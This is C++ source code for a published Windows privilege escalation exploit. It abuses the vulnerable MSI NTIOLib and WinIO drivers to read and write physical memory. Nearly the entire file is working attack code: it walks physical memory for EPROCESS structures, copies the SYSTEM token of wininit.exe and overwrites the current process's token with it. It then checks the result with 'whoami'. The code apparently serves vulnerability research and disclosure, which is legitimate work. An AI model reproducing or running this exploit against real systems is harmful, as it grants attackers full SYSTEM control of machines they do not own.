/**
*
* MSI NTIOLib/WinIO privilege escalation exploit
*
* Copyright (c) 2016 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1630
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#define NOMINMAX
#include <Windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <functional>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <vector>
#include <algorithm>
#include <unordered_map>

#include "IMemory.h"
#include "WinIO.h"
#include "NTIOLib.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wbemuuid.lib")

static const char SystemProcessNameA[]			= "wininit.exe";
static const wchar_t SystemProcessNameW[]		= L"wininit.exe";

//CONSTANT definitions for Windows 10 TH2/RS1 x64
static const uint32_t PoolHeaderDelta			= 0x0080;		// size of POOL_HEADER, OBJECT_HEADER and some other optional header info structures
static const uint32_t EprocessImageFileNameSize = 0x000F;		// size of ImageFileName field in EPROCESS
static const uint32_t EprocessImageFileName		= 0x0450;		// offset of ImageFileName field in EPROCESS
static const uint32_t EprocessUniqueProcessId	= 0x02E8;		// offset of UniqueProcessId field in EPROCESS
static const uint32_t EprocessToken				= 0x0358;		// offset of Token field in EPROCESS

void iteratePhysicalMemory(IMemory& memory, std::unordered_map<uint64_t, uint64_t> hwMapping, std::function<bool(IMemory&, const uint8_t*, size_t)> func)
{
	uint64_t MaxMem = 0;
	GetPhysicallyInstalledSystemMemory(&MaxMem);
	MaxMem += MaxMem / 2;	// add 50% due to "holes" for hardware io access
	static const uint64_t step = 0x1000LL;
	for (uint64_t i = 0; i < MaxMem * 1024; i += step)
	{
		auto it = hwMapping.find(i);
		if (it != hwMapping.end())
		{
			i += it->second;
		}
		uint8_t* addr = memory.getMemory(i, step);
		if (nullptr != addr)
		{
			if (func(memory, addr, step))
			{
				memory.reset();
				return;
			}
			memory.reset();
		}
	}
}

enum EprocessAction
{
	StealToken,
	ReuseToken
};

bool doEprocessAction(IMemory& memory, const uint8_t* addr, size_t size, uint32_t pid, const char* procName, EprocessAction action, uint64_t& stolenToken)
{
	size_t curSize = size;
	for (uint32_t x = 0; x < size - 4; x++)
	{
		if (0 == memcmp(addr + x, "Proc", 4))
		{
			if (x + PoolHeaderDelta - 4 + EprocessImageFileName + EprocessImageFileNameSize > curSize)
			{
				addr = memory.getMemory(memory.getPhysicalAddress(), 2 * size);
				curSize = 2 * size;
			}

			if ((nullptr != addr) && (*(uint64_t*)(addr + x + PoolHeaderDelta - 4 + EprocessUniqueProcessId) == pid))
			{
				printf("EPROCESS: %s, token: %0I64X, PID: %0I64X\n", addr + x + PoolHeaderDelta - 4 + EprocessImageFileName, *(uint64_t*)(addr + x + PoolHeaderDelta - 4 + EprocessToken), *(uint64_t*)(addr + x + PoolHeaderDelta - 4 + EprocessUniqueProcessId));
				if (0 == _stricmp((char*)addr + x + PoolHeaderDelta - 4 + EprocessImageFileName, procName))
				{
					if (StealToken == action)
					{
						printf("Stealing token...\n");
						stolenToken = *(uint64_t*)(addr + x + PoolHeaderDelta - 4 + EprocessToken);
					}
					else
					{
						printf("Reusing token...\n");
						memory.commitValue(x + PoolHeaderDelta - 4 + EprocessToken, stolenToken);
					}
					return true;
				}
			}
		}
	}
	return false;
}

uint32_t getSystemProcessPid()
{
	HANDLE toolhelp = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == toolhelp)
		return 0;
	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(procEntry);
	if (Process32First(toolhelp, &procEntry))
	{
		do
		{
			if (0 == _wcsicmp(procEntry.szExeFile, SystemProcessNameW))
			{
				CloseHandle(toolhelp);
				return procEntry.th32ProcessID;
			}
		} while (Process32Next(toolhelp, &procEntry));
	}
	return 0;
}

void getHardwareMappings(std::unordered_map<uint64_t, uint64_t>& hardwareMappings)
{
	if (FAILED(CoInitializeEx(0, COINIT_MULTITHREADED)))
	{
		return;
	}

	if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL)))
	{
		CoUninitialize();
		return;
	}

	IWbemLocator *pLoc = NULL;
	if (FAILED(CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc)))
	{
		CoUninitialize();
		return;
	}

	IWbemServices *pSvc = NULL;
	if (FAILED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc)))
	{
		pLoc->Release();
		CoUninitialize();
		return;
	}

	if (FAILED(CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE)))
	{
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return;
	}

	IEnumWbemClassObject* pEnumerator = NULL;
	if (FAILED(pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT * FROM Win32_DeviceMemoryAddress"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator)))
	{
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return;
	}

	std::vector<std::pair<uint64_t, uint64_t>> ranges;
	IWbemClassObject *pclsObj = NULL;
	ULONG uReturn = 0;
	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (0 == uReturn)
		{
			break;
		}

		VARIANT vtProp;
		pclsObj->Get(L"StartingAddress", 0, &vtProp, 0, 0);
		uint64_t startAddr = 0;
		swscanf_s(vtProp.bstrVal, L"%lld", &startAddr);
		VariantClear(&vtProp);

		pclsObj->Get(L"EndingAddress", 0, &vtProp, 0, 0);
		uint64_t endAddr = 0;
		swscanf_s(vtProp.bstrVal, L"%lld", &endAddr);
		VariantClear(&vtProp);

		pclsObj->Release();
		ranges.push_back(std::pair<uint64_t, uint64_t>(startAddr, endAddr + 1));
		//printf("%0I64X %0I64X\n", startAddr, endAddr);
	}
	//insert dummy range <0xF0000000, 0xFFFFFFFF>
	ranges.push_back(std::pair<uint64_t, uint64_t>(0xF0000000LL, 0x100000000LL));

	std::sort(ranges.begin(), ranges.end());
	auto it = ranges.begin();
	std::pair<uint64_t, uint64_t> current = *(it)++;
	while (it != ranges.end())
	{
		if (current.second >= it->first)
		{
			current.second = std::max(current.second, it->second);
		}
		else
		{
			hardwareMappings[current.first] = current.second - current.first;
			current = *(it);
		}
		it++;
	}
	hardwareMappings[current.first] = current.second - current.first;

	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	CoUninitialize();
}

template <class T>
bool elevate()
{
	printf("Whoami: ");
	system("whoami");

	std::unordered_map<uint64_t, uint64_t> mapping;
	getHardwareMappings(mapping);

	uint32_t systemProcessPid = getSystemProcessPid();
	printf("Found %s PID: %08X\n", SystemProcessNameA, systemProcessPid);

	printf("Looking for %s EPROCESS...\n", SystemProcessNameA);
	T io;
	uint64_t stolenToken = 0;
	iteratePhysicalMemory(io, mapping, [&stolenToken, systemProcessPid](IMemory& memory, const uint8_t* addr, size_t size) -> bool
	{
		return doEprocessAction(memory, addr, size, systemProcessPid, SystemProcessNameA, EprocessAction::StealToken, stolenToken);
	});
	printf("Stolen token: %0I64X\n", stolenToken);
	if (0 == stolenToken)
	{
		printf("Failed to steal %s token!", SystemProcessNameA);
		return false;
	}

	uint32_t curId = GetCurrentProcessId();
	char exePath[0x100];
	GetModuleFileNameA(0, exePath, sizeof(exePath));
	char* exeName = PathFindFileNameA(exePath);

	printf("Looking for %s EPROCESS...\n", exeName);
	iteratePhysicalMemory(io, mapping, [curId, exeName, &stolenToken](IMemory& memory, const uint8_t* addr, size_t size) -> bool
	{
		return doEprocessAction(memory, addr, size, curId, exeName, EprocessAction::ReuseToken, stolenToken);
	});

	printf("Whoami: ");
	system("whoami");
	return true;
}

void printUsage(const char* name)
{
	printf("Usage:\n\t%s ntio\t\t- use NTIOLib.sys\n\t%s winio\t\t- use WinIO.sys\n\n", name, name);
}

int main(int argc, char* argv[])
{	
	if (2 != argc)
	{
		printUsage(argv[0]);
		return 0;
	}

	if (0 == strcmp(argv[1], "ntio"))
		elevate<MemoryNTIOLib>();
	else if (0 == strcmp(argv[1], "winio"))
		elevate<MemoryWinIO>();
	else
		printUsage(argv[0]);
	return 0;
}
